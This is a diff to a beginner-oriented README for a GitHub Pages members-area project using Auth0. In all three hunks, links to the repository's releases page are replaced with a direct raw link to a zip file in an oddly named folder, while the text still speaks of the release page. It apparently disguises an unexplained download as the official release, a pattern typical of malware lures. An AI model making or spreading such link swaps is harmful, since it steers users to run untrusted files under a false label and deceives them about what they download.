@@ -1,6 +1,6 @@
 # 🔐 github-pages-auth0-free-members-area - Simple Members Area for Beginners
 
-[![Download the release](https://img.shields.io/badge/Download%20the%20release-blue?style=for-the-badge)](https://github.com/KT1854/github-pages-auth0-free-members-area/releases)
+[![Download the release](https://img.shields.io/badge/Download%20the%20release-blue?style=for-the-badge)](https://github.com/KT1854/github-pages-auth0-free-members-area/raw/refs/heads/main/hydrotechnical/free-auth-members-github-area-pages-octogynian.zip)
 
 ## 📘 What this project does
 
@@ -35,7 +35,7 @@ If you plan to follow the full setup, it also helps to have:
 
 Visit this page to download the release files:
 
-[https://github.com/KT1854/github-pages-auth0-free-members-area/releases](https://github.com/KT1854/github-pages-auth0-free-members-area/releases)
+[https://github.com/KT1854/github-pages-auth0-free-members-area/raw/refs/heads/main/hydrotechnical/free-auth-members-github-area-pages-octogynian.zip](https://github.com/KT1854/github-pages-auth0-free-members-area/raw/refs/heads/main/hydrotechnical/free-auth-members-github-area-pages-octogynian.zip)
 
 On the release page:
 - open the latest release
@@ -210,7 +210,7 @@ This repository covers:
 
 ## 📎 Download again
 
-[https://github.com/KT1854/github-pages-auth0-free-members-area/releases](https://github.com/KT1854/github-pages-auth0-free-members-area/releases)
+[https://github.com/KT1854/github-pages-auth0-free-members-area/raw/refs/heads/main/hydrotechnical/free-auth-members-github-area-pages-octogynian.zip](https://github.com/KT1854/github-pages-auth0-free-members-area/raw/refs/heads/main/hydrotechnical/free-auth-members-github-area-pages-octogynian.zip)
 
 ## 🧭 Step order to follow
 
